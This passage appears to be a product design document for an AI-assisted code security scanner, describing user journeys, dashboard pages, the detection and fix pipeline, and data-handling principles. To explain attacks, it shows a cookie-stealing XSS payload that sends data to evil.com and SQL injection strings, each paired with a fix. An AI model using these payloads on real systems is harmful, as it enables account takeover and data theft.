# ZeroMetus — Product Design Document

**AI-Powered Security & Code Fixing Platform**

Version 1.0 | MVP Design Specification  
Prepared for: Competition Judges, Investors, Technical Stakeholders

---

## Table of Contents

1. [Product Vision & Positioning](#1-product-vision--positioning)
2. [User Roles](#2-user-roles)
3. [User Journeys](#3-user-journeys)
4. [Input Methods](#4-input-methods)
5. [Dashboard Pages](#5-dashboard-pages)
6. [AI Agent Behavior](#6-ai-agent-behavior)
7. [Security & Trust Design](#7-security--trust-design)
8. [MVP Limitations](#8-mvp-limitations)
9. [Roadmap](#9-roadmap)
10. [Why This MVP Wins](#10-why-this-mvp-wins)

---

## 1. Product Vision & Positioning

### What ZeroMetus Is

ZeroMetus is an AI-powered security analysis platform that helps developers find, understand, and fix vulnerabilities in their code before they reach production. Unlike traditional static analysis tools that dump hundreds of warnings without context, ZeroMetus combines rule-based detection with AI reasoning to explain *why* something is dangerous and *how* to fix it safely.

The name "ZeroMetus" derives from Latin — "zero fear" — representing our mission: developers should ship code confidently, not anxiously.

### Who It Is For

**Primary Users:**
- **Individual Developers** building side projects, portfolios, or learning secure coding
- **Startup Engineering Teams** (2-20 developers) who lack dedicated security staff
- **Computer Science Students** learning application security through real feedback
- **Freelancers and Agencies** who need to demonstrate security diligence to clients

**Secondary Users:**
- **Security Champions** within larger organizations seeking a triage assistant
- **Code Reviewers** who want security context during pull request reviews
- **Technical Founders** preparing codebases for investor due diligence

### The Problem We Solve

Modern developers face a paradox: security is more critical than ever, yet most lack the expertise, time, or tooling to address it properly.

**Current Pain Points:**

1. **Alert Fatigue** — Tools like SonarQube generate hundreds of warnings. Developers ignore them because they cannot prioritize.

2. **No Context** — Most scanners say "SQL Injection detected" but do not explain the attack scenario or business risk.

3. **No Actionable Fixes** — Developers know something is wrong but not how to fix it safely without breaking functionality.

4. **Expertise Gap** — Security engineers are expensive and scarce. Startups cannot afford dedicated AppSec until Series B.

5. **Fragmented Workflow** — Developers must context-switch between IDE, security tool, documentation, and Stack Overflow.

ZeroMetus consolidates detection, explanation, and remediation into a single workflow.

### How We Differ From Existing Tools

| Aspect | Snyk | SonarQube | GitHub Copilot | ZeroMetus |
|--------|------|-----------|----------------|-----------|
| **Focus** | Dependencies (SCA) | Code quality + some security | Code completion | Security-first with AI reasoning |
| **Explanation Depth** | Links to CVE database | Rule documentation | None | Contextual AI explanation per finding |
| **Fix Generation** | Dependency upgrades | None | General code suggestions | Security-specific fix proposals |
| **Learning Value** | Low | Low | None | High — explains attack vectors |
| **Setup Complexity** | CI/CD integration required | Server installation | IDE plugin | Zero setup — paste and scan |
| **Target User** | DevOps/Security teams | Enterprise QA | All developers | Developers without security expertise |

**Our Unique Position:** ZeroMetus is the "security co-pilot" — not just a scanner, but an explainer and teacher that helps developers build secure coding habits over time.

### Why AI-Agent Reasoning Matters

Traditional static analysis uses pattern matching: "If code matches regex X, flag it."

This approach fails because:
- It cannot understand intent or context
- It produces false positives that erode trust
- It cannot explain *why* something matters
- It cannot generate contextually appropriate fixes

**AI-agent reasoning adds:**

1. **Contextual Understanding** — The AI reads surrounding code to determine if a pattern is actually exploitable in context.

2. **Risk Articulation** — Instead of "XSS vulnerability," the AI explains: "An attacker could inject JavaScript through this user input field, potentially stealing session cookies from other users."

3. **Fix Synthesis** — The AI generates fixes that preserve functionality while eliminating the vulnerability, using patterns appropriate to the codebase's style.

4. **Educational Value** — Explanations help developers understand security principles, not just fix individual issues.

This is not magic — it is a deliberate architecture combining deterministic detection with probabilistic reasoning.

---

## 2. User Roles

ZeroMetus implements a role-based access model that scales from individual use to team collaboration.

### Guest User

**Definition:** A visitor who has not created an account.

**Capabilities:**
- View the landing page and product information
- Access documentation and security resources
- Perform a single "demo scan" with pasted code (limited to 500 lines)
- View sample vulnerability reports

**Limitations:**
- Cannot save projects or scan history
- Cannot upload files or repositories
- Cannot access AI-generated fixes (only detection results)
- Session data is not persisted

**Purpose:** Lower the barrier to entry. Let developers experience value before committing to registration.

### Registered Developer

**Definition:** An authenticated user with a free or paid account.

**Capabilities:**
- Create and manage personal projects
- Submit code via all input methods (paste, upload, ZIP, GitHub URL)
- View full scan results with AI explanations
- Access AI-generated fix suggestions
- View personal scan history and trends
- Export reports (PDF, JSON)
- Configure notification preferences

**Limitations:**
- Cannot share projects with other users
- Usage limits based on plan tier (scans per month, lines of code)

**Purpose:** The core user experience. Most users operate at this level.

### Project Owner

**Definition:** A registered developer who has created a project.

**Capabilities:**
- All registered developer capabilities
- Invite team members to specific projects
- Set project visibility (private/team)
- Configure project-specific scan settings
- Delete project and all associated data
- Transfer project ownership

**Purpose:** Enable collaboration while maintaining clear ownership and accountability.

### Team Member (Future Enhancement)

**Definition:** A registered developer invited to collaborate on a project they do not own.

**Capabilities:**
- View project scan results
- Initiate new scans
- Review and comment on vulnerabilities
- Cannot delete the project or change ownership
- Cannot invite additional members (unless granted permission)

**Purpose:** Support team workflows without requiring everyone to be a project owner.

---

## 3. User Journeys

### Journey A: First-Time User (Landing Page to First Scan)

**Persona:** Alex, a junior developer who just read about SQL injection and wants to check their code.

**Step 1: Discovery**
Alex lands on the ZeroMetus homepage after a Google search for "check my code for security issues." The landing page immediately communicates value: "Find security vulnerabilities in your code. Get AI-powered explanations and fixes."

**Step 2: Instant Value**
Without scrolling, Alex sees a "Try it now" section with a code input box. No signup required. The placeholder text shows an example vulnerable snippet.

**Step 3: Paste and Scan**
Alex pastes 50 lines of Python code from their Flask application. They click "Scan Code." A progress indicator shows the analysis is running.

**Step 4: Results Preview**
Within 10 seconds, results appear: "3 vulnerabilities found — 1 Critical, 1 High, 1 Medium." Each finding shows a one-line summary. Alex sees their SQL injection vulnerability highlighted.

**Step 5: Conversion Prompt**
Below the results, a message appears: "Create a free account to see AI explanations and suggested fixes." Alex is intrigued enough to register.

**Step 6: Registration**
Alex enters email, creates a password, and verifies via email link. The original scan results are preserved and now enhanced with full AI analysis.

**Step 7: First Insight**
Alex clicks on the SQL injection finding. The AI explains: "This query concatenates user input directly into SQL. An attacker could input `' OR 1=1 --` to bypass authentication and access all user records." Alex understands the real risk for the first time.

**Outcome:** Alex goes from curiosity to actionable understanding in under 5 minutes. They now trust ZeroMetus and will return.

---

### Journey B: Logged-In User Scanning a Project

**Persona:** Maria, a startup CTO who scans her codebase weekly.

**Step 1: Dashboard Entry**
Maria logs in and sees her dashboard. Her project "PaymentAPI" shows a badge: "Last scanned 7 days ago."

**Step 2: Initiate Scan**
Maria clicks on "PaymentAPI" and selects "New Scan." She chooses "GitHub Sync" — the repository URL is already saved from previous configuration.

**Step 3: Branch Selection**
A dropdown shows available branches. Maria selects "develop" (the active development branch). She clicks "Start Scan."

**Step 4: Progress Tracking**
The UI shows scan progress: "Fetching repository... Analyzing 47 files... Running security checks..." Maria can navigate away; she will be notified when complete.

**Step 5: Notification**
Three minutes later, Maria receives a browser notification: "Scan complete — 2 new vulnerabilities detected." She clicks to view results.

**Step 6: Delta View**
The results page highlights what changed since the last scan. Two new issues appeared in files modified this week. Maria focuses her review on these.

**Outcome:** Maria efficiently monitors security posture across development cycles without manual effort.

---

### Journey C: User Reviewing Vulnerabilities

**Persona:** James, a developer who just received scan results with 12 findings.

**Step 1: Results Overview**
James opens the Scan Results page. A summary bar shows: 2 Critical (red), 4 High (orange), 3 Medium (yellow), 3 Low (blue).

**Step 2: Prioritization**
James clicks "Critical" to filter. Only the two most severe issues display. He starts with the highest-risk item.

**Step 3: Finding Context**
The first finding shows:
- **Type:** Hardcoded Secret
- **File:** `config/database.py`
- **Line:** 23
- **Snippet:** `password = "prod_db_2024!"`
- **Severity:** Critical
- **OWASP:** A02:2021 - Cryptographic Failures

**Step 4: Code Navigation**
James clicks "View in context." The UI shows the code file with the vulnerable line highlighted, plus 10 lines above and below for context.

**Step 5: Bulk Actions**
For the three "Low" findings that are acceptable risks in his context (e.g., development-only code), James selects them and marks as "Acknowledged — Won't Fix" with a note explaining the rationale.

**Step 6: Export**
James exports the remaining findings as a PDF report to share with his team lead.

**Outcome:** James triages 12 findings in 10 minutes, focusing effort on what matters.

---

### Journey D: User Reviewing AI Explanations and Fixes

**Persona:** Sara, a developer who found a Cross-Site Scripting (XSS) vulnerability and wants to understand it.

**Step 1: Open Detail View**
Sara clicks on the XSS finding to open the Vulnerability Detail View.

**Step 2: Read the Explanation**
The AI Explanation section shows:

> "This code renders user-supplied content directly into HTML without sanitization. An attacker could submit a comment containing `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. When other users view this comment, the script executes in their browser, sending their session cookies to the attacker. This enables account takeover."

Sara now understands the actual attack scenario, not just the abstract category.

**Step 3: Review the Fix**
Below the explanation, the AI Fix section shows:

> **Recommended Fix:**
> Replace direct HTML rendering with a sanitization function.
>
> **Before:**
> `return f"<div>{user_comment}</div>"`
>
> **After:**
> `from markupsafe import escape`
> `return f"<div>{escape(user_comment)}</div>"`
>
> **Explanation:** The `escape()` function converts special characters like `<` and `>` into HTML entities (`&lt;` and `&gt;`), preventing the browser from interpreting them as code.

**Step 4: Understand Confidence**
A confidence indicator shows: "High confidence fix — This pattern is well-established for Flask applications."

**Step 5: Learn More**
Sara clicks "Learn more about XSS" which opens an educational sidebar with OWASP references and additional examples.

**Outcome:** Sara learns both the fix and the underlying principle, making her a better developer.

---

### Journey E: User Approving or Rejecting Fixes

**Persona:** Tom, a team lead reviewing AI-suggested fixes before applying them.

**Step 1: Fix Queue**
Tom opens the "Pending Fixes" view, which shows all AI-generated fixes awaiting review for his project.

**Step 2: Review Individual Fix**
Tom selects a fix for a path traversal vulnerability. The UI shows:
- Original code (highlighted in red)
- Proposed fix (highlighted in green)
- Diff view toggle
- AI reasoning for why this fix works

**Step 3: Evaluate**
Tom considers:
- Does the fix preserve functionality?
- Is it consistent with our coding standards?
- Are there edge cases the AI might have missed?

**Step 4: Request Clarification**
Tom is unsure about one aspect. He clicks "Ask AI" and types: "Will this break file uploads from subdirectories?" The AI responds with analysis specific to his code context.

**Step 5: Approve**
Satisfied, Tom clicks "Approve Fix." The UI shows options:
- "Copy to clipboard" (manual application)
- "Download patch file"
- "Apply via GitHub PR" (future feature)

Tom copies the code and applies it in his IDE.

**Step 6: Reject with Reason**
For another fix, Tom clicks "Reject" and selects a reason: "Fix is correct but conflicts with existing architecture." This feedback improves future AI suggestions.

**Step 7: Mark as Resolved**
After applying the fix, Tom returns and marks the vulnerability as "Resolved." The next scan will verify the fix.

**Outcome:** Tom maintains full control while leveraging AI efficiency. Nothing is auto-applied without human review.

---

## 4. Input Methods

ZeroMetus supports multiple ways to submit code, each designed for different use cases and user preferences.

### Method 1: Paste Code Directly

**Use Case:** Quick checks, code snippets, learning, Stack Overflow answers.

**User Experience:**
1. User sees a large text area on the dashboard
2. User pastes code directly
3. User selects language from dropdown (or relies on auto-detection)
4. User clicks "Scan"

**Validation Rules:**
- Minimum: 1 line of code
- Maximum: 10,000 lines (free tier) / 50,000 lines (paid tier)
- Supported languages: Python, JavaScript, TypeScript, Java, C#, Go, PHP, Ruby, SQL
- Empty or whitespace-only input is rejected

**UX Details:**
- Line numbers displayed in the text area
- Syntax highlighting after language detection
- Character/line count shown in real-time
- "Clear" button to reset
- "Load example" button with pre-filled vulnerable code samples

**Why This Matters:** Zero friction. A developer can check suspicious code in seconds without creating a project or uploading files.

---

### Method 2: Upload a Single File

**Use Case:** Checking a specific file before committing, reviewing downloaded code.

**User Experience:**
1. User clicks "Upload File" or drags a file onto the drop zone
2. File is validated and previewed
3. User clicks "Scan"

**Validation Rules:**
- Maximum file size: 5 MB
- Allowed extensions: `.py`, `.js`, `.ts`, `.java`, `.cs`, `.go`, `.php`, `.rb`, `.sql`, `.jsx`, `.tsx`
- Binary files are rejected with a clear message
- Files with no extension prompt language selection

**UX Details:**
- Drag-and-drop support with visual feedback
- File name and size displayed after upload
- Preview of first 50 lines
- Option to remove and re-upload

**Error Handling:**
- Oversized files: "This file exceeds the 5 MB limit. Consider uploading as a ZIP or connecting via GitHub."
- Unsupported type: "We don't currently support .xyz files. Supported formats: [list]"
- Encoding issues: "This file contains characters we couldn't read. Please ensure it's UTF-8 encoded."

---

### Method 3: Upload a ZIP Project

**Use Case:** Scanning an entire codebase, freelance project review, portfolio analysis.

**User Experience:**
1. User clicks "Upload Project (ZIP)"
2. User selects or drags a ZIP file
3. System extracts and shows file tree preview
4. User optionally excludes directories (e.g., `node_modules`, `venv`)
5. User clicks "Scan Project"

**Validation Rules:**
- Maximum ZIP size: 50 MB (free) / 200 MB (paid)
- Maximum files after extraction: 500 (free) / 2,000 (paid)
- Nested ZIPs are not recursively extracted
- Symbolic links are ignored for security
- Only text files matching supported extensions are scanned

**UX Details:**
- Upload progress bar for large files
- Extraction progress indicator
- File tree with checkboxes to include/exclude
- Pre-configured exclusion patterns: `node_modules/`, `vendor/`, `__pycache__/`, `.git/`
- Total scannable lines count displayed

**Security Measures:**
- ZIP bomb detection (reject if extraction ratio exceeds 100:1)
- Path traversal prevention (reject entries with `../`)
- Files are extracted to isolated temporary storage
- All uploaded content is deleted within 24 hours

---

### Method 4: GitHub Repository URL

**Use Case:** Ongoing project monitoring, team collaboration, accurate file structure analysis.

**User Experience:**
1. User clicks "Connect GitHub Repository"
2. User pastes repository URL or authenticates via GitHub OAuth
3. System validates access and shows repository metadata
4. User selects branch to scan
5. User optionally configures paths to include/exclude
6. User clicks "Start Scan"

**Validation Rules:**
- Repository must be accessible (public, or private with OAuth authorization)
- Maximum repository size: 100 MB of scannable code
- Rate limiting: 10 repository scans per hour per user
- Supported hosts: GitHub.com (GitLab and Bitbucket in roadmap)

**UX Details:**
- Repository name, description, and last commit displayed
- Branch dropdown with default branch pre-selected
- Option to save configuration for recurring scans
- Webhook setup option for automatic scanning on push (future)

**Authentication Options:**
- Public repositories: No authentication required
- Private repositories: GitHub OAuth with minimal scopes (`repo:read`)
- OAuth tokens are encrypted at rest and never logged

**Error Handling:**
- Invalid URL: "This doesn't appear to be a valid GitHub URL. Expected format: https://github.com/owner/repo"
- Access denied: "We couldn't access this repository. If it's private, please connect your GitHub account."
- Empty repository: "This repository doesn't contain any code files we can scan."

---

### Method 5: CI/CD Integration (Future)

**Use Case:** Automated security gates in deployment pipelines.

**Planned Experience:**
1. User generates an API key in Settings
2. User adds ZeroMetus step to CI/CD configuration
3. Pipeline sends code or triggers repository scan
4. ZeroMetus returns results via API
5. Pipeline can pass/fail based on severity thresholds

**Design Considerations:**
- API response time SLA: < 60 seconds for typical projects
- Configurable fail thresholds (e.g., fail on Critical, warn on High)
- SARIF output format for GitHub Security tab integration
- Caching to avoid re-scanning unchanged files

**Why Deferred to Post-MVP:** CI/CD integration requires production-grade reliability, comprehensive API documentation, and customer support infrastructure. The MVP focuses on proving the core value proposition first.

---

## 5. Dashboard Pages

### Page A: Landing Page

**URL:** `/` (unauthenticated)

**Purpose:** Convert visitors into users by demonstrating immediate value and building trust.

**Layout Structure:**

**Hero Section:**
- Headline: "Ship Secure Code with Confidence"
- Subheadline: "AI-powered vulnerability detection that explains issues and suggests fixes"
- Primary CTA: "Scan Your Code Free" (leads to demo scan)
- Secondary CTA: "Watch Demo" (30-second video)

**Instant Demo Section:**
- Code input area with placeholder example
- "Scan" button
- Results preview (for guests, limited output)

**Value Proposition Grid:**
- "Detect" — Find vulnerabilities across OWASP Top 10
- "Understand" — AI explains why each issue matters
- "Fix" — Get contextual code fixes, not just warnings
- "Learn" — Build secure coding habits over time

**Social Proof Section:**
- "Trusted by 500+ developers" (or appropriate metric)
- Testimonial quotes from beta users
- "Used to secure 10,000+ files"

**Security & Trust Section:**
- "Your code is never stored permanently"
- "Analysis happens in isolated environments"
- "All fixes require your explicit approval"
- SOC 2 badge (when applicable)
- Open-source scanner engine (if applicable)

**Comparison Section:**
- Brief comparison with alternatives
- "Unlike traditional scanners, ZeroMetus explains *why* and shows *how*"

**Footer:**
- Documentation link
- Privacy policy
- Terms of service
- Contact/support

**Why This Page Matters:** First impressions determine conversion. Visitors must understand value in 5 seconds and experience it in 30 seconds.

---

### Page B: Authentication Pages

**URLs:** `/login`, `/signup`, `/reset-password`

**Purpose:** Minimize friction while maintaining security.

**Sign Up Page:**
- Email input
- Password input (with strength indicator)
- "Create Account" button
- "Or continue with GitHub" (OAuth)
- Link to login for existing users
- Link to terms and privacy policy

**Password Requirements (displayed inline):**
- Minimum 8 characters
- At least one number
- At least one special character
- Real-time validation feedback

**Login Page:**
- Email input
- Password input
- "Remember me" checkbox
- "Log In" button
- "Forgot password?" link
- "Or continue with GitHub"
- Link to sign up

**Password Reset Flow:**
1. User enters email
2. System sends reset link (valid 1 hour)
3. User clicks link, enters new password
4. User is logged in automatically

**Security Measures:**
- Rate limiting on all auth endpoints
- Account lockout after 5 failed attempts
- Email verification required before full access
- Session tokens expire after 7 days of inactivity

**UX Details:**
- Clear error messages: "Invalid email or password" (not revealing which)
- Loading states on buttons
- Redirect to intended destination after login

---

### Page C: Main Dashboard

**URL:** `/dashboard`

**Purpose:** Provide an at-a-glance overview of security posture across all projects.

**Layout Structure:**

**Top Navigation:**
- ZeroMetus logo (links to dashboard)
- Search bar (search across projects and findings)
- Notifications bell (new scan results, etc.)
- User avatar/menu (settings, logout)

**Welcome Section:**
- "Welcome back, [Name]"
- Quick action buttons: "New Scan" / "New Project"

**Security Summary Cards:**
- Total vulnerabilities across all projects
- Breakdown by severity (Critical/High/Medium/Low)
- Trend indicator (up/down from last week)
- "X vulnerabilities fixed this month"

**Projects List:**
- Card or table view toggle
- Each project shows:
  - Project name
  - Last scan date
  - Vulnerability count badges
  - Quick actions (scan, view, settings)
- "Create New Project" card

**Recent Activity Feed:**
- "Scan completed for ProjectX — 3 issues found"
- "You resolved 2 vulnerabilities in ProjectY"
- "New critical issue detected in ProjectZ"
- Timestamps and links to relevant pages

**Quick Scan Widget:**
- "Quick scan a code snippet" with paste area
- For users who want immediate action

**Why This Page Matters:** Developers are busy. The dashboard must communicate status instantly and enable action in one click.

---

### Page D: Project Page

**URL:** `/projects/{project-id}`

**Purpose:** Deep dive into a specific project's security history and configuration.

**Layout Structure:**

**Project Header:**
- Project name (editable)
- Source indicator (uploaded, GitHub, etc.)
- Last scan timestamp
- "Run New Scan" button
- Settings gear icon

**Security Posture Summary:**
- Current vulnerability counts by severity
- Trend chart (vulnerability count over last 10 scans)
- "Security Score" (0-100, based on severity-weighted formula)

**Scan History Table:**
| Date | Trigger | Files Scanned | Critical | High | Medium | Low | Status |
|------|---------|---------------|----------|------|--------|-----|--------|
| Dec 28 | Manual | 47 | 0 | 2 | 3 | 5 | Completed |
| Dec 21 | Manual | 45 | 1 | 1 | 3 | 4 | Completed |

- Click any row to view that scan's results
- Filter by date range
- Export scan history

**Vulnerability Trends Chart:**
- Line chart showing count over time
- Separate lines for each severity
- Annotations for when fixes were applied

**Project Configuration Section:**
- Source settings (repository URL, branch, etc.)
- Scan settings (paths to include/exclude)
- Notification preferences
- Danger zone (delete project)

**Why This Page Matters:** Project Owners need historical context to understand if security is improving or degrading. Trends motivate action.

---

### Page E: Scan Results Page

**URL:** `/projects/{project-id}/scans/{scan-id}`

**Purpose:** Present all findings from a single scan in an actionable format.

**Layout Structure:**

**Scan Summary Header:**
- Scan date and duration
- Files analyzed count
- Total findings count
- Severity breakdown bar (visual)

**Filter and Sort Controls:**
- Severity filter (checkboxes)
- File/path filter
- Vulnerability type filter
- Sort by: Severity (default), File, Type

**Findings List:**
Each finding card shows:
- Severity badge (color-coded)
- Vulnerability type (e.g., "SQL Injection")
- File path and line number
- One-line description
- "View Details" button
- Quick actions: "Mark Resolved" / "Acknowledge"

**Code Snippet Preview:**
- On hover or expand, show the vulnerable code
- Syntax highlighted
- Line numbers from original file

**Bulk Actions Bar:**
- Select multiple findings
- "Mark Selected as Resolved"
- "Export Selected"
- "Acknowledge (Won't Fix)"

**No Findings State:**
- If scan found nothing: "No vulnerabilities detected. Great work!"
- Option to adjust sensitivity settings if false negatives suspected

**Pagination:**
- 20 findings per page (default)
- "Show all" option for smaller result sets

**Why This Page Matters:** This is where developers spend the most time. Clarity, filterability, and actionability determine whether they actually fix issues.

---

### Page F: Vulnerability Detail View

**URL:** `/projects/{project-id}/scans/{scan-id}/findings/{finding-id}`

**Purpose:** Provide complete context for understanding and fixing a single vulnerability.

**Layout Structure:**

**Finding Header:**
- Vulnerability type as title
- Severity badge (large, prominent)
- File path (clickable to view full file)
- Line number(s) affected
- Status indicator (Open, In Progress, Resolved, Acknowledged)

**Code Context Panel:**
- Vulnerable code highlighted
- 15+ lines of surrounding context
- Line numbers matching original file
- Syntax highlighting
- "Copy code" button

**Description Section:**
- Clear, jargon-free explanation of the vulnerability
- Attack scenario example (how an attacker could exploit this)

**OWASP Classification:**
- Category (e.g., "A03:2021 - Injection")
- Link to OWASP documentation
- Related CWE identifier

**AI Explanation Section:**
- Header: "AI Analysis"
- Contextual explanation specific to this code
- Why this particular instance is dangerous
- What data/functionality is at risk
- Confidence indicator (High/Medium/Low)

**AI Fix Suggestion Section:**
- Header: "Suggested Fix"
- Before/After code comparison
- Explanation of what the fix changes
- Why this fix is appropriate
- Warnings about potential side effects (if any)

**Fix Status Indicators:**
| Status | Meaning |
|--------|---------|
| "Fix Available" | AI generated a high-confidence fix |
| "Fix Under Review" | AI generated a fix but confidence is lower |
| "Manual Review Recommended" | Issue is too complex for automated fixing |
| "No Fix Available" | Detection only; requires human expertise |

**Action Buttons:**
- "Apply Fix" (copy or download)
- "Reject Fix" (with reason selection)
- "Mark Resolved" (after manual fix)
- "Acknowledge (Won't Fix)"
- "Report False Positive"

**Educational Resources:**
- "Learn more about [vulnerability type]"
- Links to security guides
- Similar examples

**Why This Page Matters:** This is the core value delivery. Developers must leave this page knowing exactly what to do.

---

### Page G: Settings Page

**URL:** `/settings`

**Purpose:** Allow users to manage their account and preferences.

**Layout Structure:**

**Navigation Tabs:**
- Profile
- Security
- Notifications
- API Keys (future)
- Billing (future)

**Profile Tab:**
- Display name (editable)
- Email (editable with re-verification)
- Avatar upload
- Timezone selection

**Security Tab:**
- Change password
- Two-factor authentication toggle (future)
- Active sessions list
- "Log out all devices" button
- Account deletion option

**Notifications Tab:**
- Email notifications:
  - Scan completed
  - New critical vulnerability detected
  - Weekly security digest
- Browser notifications toggle
- Notification frequency (immediate, daily digest)

**API Keys Tab (Future):**
- Generate new API key
- List active keys with last used date
- Revoke keys
- Usage documentation link

**Billing Tab (Future):**
- Current plan display
- Usage metrics (scans this month)
- Upgrade/downgrade options
- Invoice history

**Danger Zone:**
- "Delete Account" — requires password confirmation
- Clear explanation of what will be deleted
- 30-day recovery window

**Why This Page Matters:** Settings build trust. Users need to know they control their data and security.

---

## 6. AI Agent Behavior

### System Architecture Overview

The ZeroMetus AI Agent is not a single monolithic model. It is a pipeline of specialized components that work together:

```
Code Input
    ↓
[Parser] — Abstract Syntax Tree extraction
    ↓
[Rule Engine] — Deterministic pattern matching
    ↓
[Vulnerability Candidates]
    ↓
[AI Reasoner] — Context analysis, false positive filtering
    ↓
[AI Explainer] — Human-readable explanations
    ↓
[AI Fixer] — Code fix generation
    ↓
[Confidence Scorer] — Quality assessment
    ↓
Final Output
```

### Stage 1: Detection (Deterministic)

**What It Does:**
The rule engine uses Abstract Syntax Tree (AST) parsing and pattern matching to identify potential vulnerabilities. This is fast, consistent, and explainable.

**Technologies:**
- Language-specific parsers (Python AST, ESLint, etc.)
- Regular expression patterns for common issues
- Semantic analysis for data flow tracking

**Examples of Detection Rules:**
- SQL queries containing string concatenation with user input
- Passwords or API keys in string literals
- Cryptographic operations with weak algorithms
- Insecure deserialization calls
- Missing input validation on external data

**Output:**
A list of candidate vulnerabilities with:
- Location (file, line, column)
- Pattern matched
- Raw code snippet
- Preliminary severity classification

**Why Deterministic:**
- Speed: Processes thousands of files in seconds
- Consistency: Same input always produces same candidates
- Auditability: Every detection can be traced to a specific rule

### Stage 2: Reasoning (AI-Powered)

**What It Does:**
The AI Reasoner evaluates each candidate to determine if it is a true positive and to understand its context.

**Input to AI:**
```
- Vulnerability type: SQL_INJECTION
- File: user_service.py
- Line: 47
- Code snippet: query = f"SELECT * FROM users WHERE id = {user_id}"
- Surrounding context: [20 lines before and after]
- Function signature: def get_user(user_id: str)
- Call chain: [where this function is called from]
```

**AI Reasoning Process:**
1. Is `user_id` actually user-controlled? (Check call chain)
2. Is there sanitization elsewhere that we might have missed?
3. What is the blast radius if exploited? (What data is exposed)
4. Are there mitigating factors? (e.g., authentication layer)

**Output:**
- Confidence score (0-100%)
- True positive / likely false positive classification
- Risk assessment
- Context-aware notes

**Why AI for Reasoning:**
Pattern matching cannot understand context. AI can recognize that a hardcoded string labeled `DEFAULT_CONFIG` is different from one labeled `password`.

### Stage 3: Explanation Generation (AI-Powered)

**What It Does:**
Generates human-readable explanations tailored to each specific finding.

**Input to AI:**
- Vulnerability metadata
- Code context
- Target audience (developer skill level, if known)

**Output Structure:**
1. **What is happening:** Plain English description
2. **Why it matters:** Specific attack scenario for this code
3. **What is at risk:** Data, users, or systems affected
4. **How severe:** Calibrated severity with justification

**Example Output:**
> "This code builds a SQL query by inserting the `user_id` parameter directly into the query string. Because `user_id` comes from the HTTP request, an attacker can manipulate it to execute arbitrary SQL commands. For example, sending `user_id=1 OR 1=1` would return all users instead of just one. In this application, that would expose names, emails, and password hashes of all registered users."

**Why AI for Explanation:**
Generic explanations ("SQL injection is bad") do not help developers understand their specific risk. Contextual explanations drive action.

### Stage 4: Fix Generation (AI-Powered)

**What It Does:**
Generates secure code that fixes the vulnerability while preserving functionality.

**Input to AI:**
- Original vulnerable code
- Surrounding context (imports, class definitions, etc.)
- Coding style patterns from the file
- Framework/library detection

**Fix Generation Process:**
1. Identify the specific insecure pattern
2. Determine the appropriate secure alternative
3. Generate replacement code matching existing style
4. Verify the fix does not introduce new issues
5. Add necessary imports if required

**Output:**
- Fixed code snippet
- Explanation of changes
- Any warnings about side effects
- Confidence score

**Example:**
```python
# Before (vulnerable)
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# After (secure)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))

# Explanation: Using parameterized queries separates SQL code
# from data, preventing injection attacks.
```

### Handling Uncertainty

Not all vulnerabilities can be fixed automatically. ZeroMetus communicates this honestly:

**High Confidence Fix:**
- Well-known vulnerability pattern
- Established fix pattern
- No complex dependencies
- Display: "Suggested fix is ready"

**Medium Confidence Fix:**
- Fix generated but may need adjustment
- Some contextual ambiguity
- Display: "Suggested fix available — review recommended"

**Low Confidence / No Fix:**
- Complex architectural issue
- Business logic vulnerability
- Novel or unusual pattern
- Display: "Manual review recommended — AI analysis provided"

**Why This Matters:**
Over-confident AI erodes trust. By clearly communicating uncertainty, users know when to rely on automation and when to engage deeper expertise.

---

## 7. Security & Trust Design

Security is not just a feature of ZeroMetus — it is foundational to our credibility. Users trust us with their source code. We must earn that trust through transparent practices.

### Principle 1: Code Is Never Executed

**What We Do:**
- All analysis is static (reading and parsing only)
- No code is ever compiled, interpreted, or run
- No subprocess execution based on user input
- No eval(), exec(), or equivalent in our analysis pipeline

**Why It Matters:**
If we executed user code, a malicious actor could:
- Exfiltrate data from our servers
- Attack other users' code through our infrastructure
- Use our platform as a botnet node

Static analysis eliminates this entire attack class.

**User Communication:**
"Your code is analyzed, never executed. ZeroMetus reads your code like a human reviewer would — we parse it, we don't run it."

### Principle 2: Data Isolation

**What We Do:**
- Each user's data is logically isolated in the database
- Project IDs are UUIDs (not guessable sequential integers)
- All queries include user ownership checks
- File storage uses user-scoped paths
- No cross-tenant data access is architecturally possible

**Technical Implementation:**
- Row-level security policies where supported
- Middleware that injects user context into all queries
- Automated tests that verify isolation

**User Communication:**
"Your code is isolated from all other users. Our architecture ensures that no one — including our own staff — can access your projects without authorization."

### Principle 3: Auto-Fixes Require Approval

**What We Do:**
- AI-generated fixes are suggestions, not automatic changes
- Users must explicitly approve each fix
- Approving a fix does not modify the original source
- Users receive the fixed code to apply themselves

**Why It Matters:**
- AI can be wrong; humans must verify
- Users maintain full control of their codebase
- No risk of AI introducing breaking changes silently
- Establishes appropriate trust in AI assistance

**User Communication:**
"ZeroMetus never modifies your code automatically. Every suggested fix requires your explicit approval. You remain in complete control."

### Principle 4: Audit Logging

**What We Do:**
- Every significant action is logged with timestamp and actor
- Scans, fix approvals, rejections, settings changes
- Logs are immutable and retained for 90 days
- Users can view their own audit history

**Log Contents:**
- What action was taken
- Who took it (user ID)
- When (timestamp)
- What was affected (project, finding, etc.)
- Outcome (success, failure, etc.)

**What We Do Not Log:**
- Code content in logs (only references)
- Passwords (never stored, only hashes)
- Full AI prompts (only sanitized summaries)

**User Communication:**
"All actions in ZeroMetus are logged. You can view your activity history in Settings. These logs help you maintain compliance and investigate any issues."

### Principle 5: AI Decision Transparency

**What We Do:**
- Every AI output includes a confidence indicator
- Users can see why the AI made its assessment
- AI reasoning is logged for audit purposes
- "Why did the AI say this?" is always answerable

**Transparency Elements:**
- Confidence percentage
- Factors that influenced the decision
- Acknowledgment when AI is uncertain
- Option to report disagreement

**User Communication:**
"Our AI explains its reasoning. If you disagree with an assessment, you can mark it as a false positive, and we use that feedback to improve."

### Principle 6: Data Retention and Deletion

**What We Do:**
- Uploaded code (paste/file) is retained only for active session + 24 hours
- Project data is retained while the project exists
- Deleted projects are purged within 30 days (recovery window)
- Account deletion triggers full data purge after recovery period
- Users can request immediate data export or deletion

**User Communication:**
"You control your data. Delete a project, and it's gone within 30 days. Delete your account, and all your data is permanently removed."

### Security in the Product Narrative

For pitch and demo contexts:

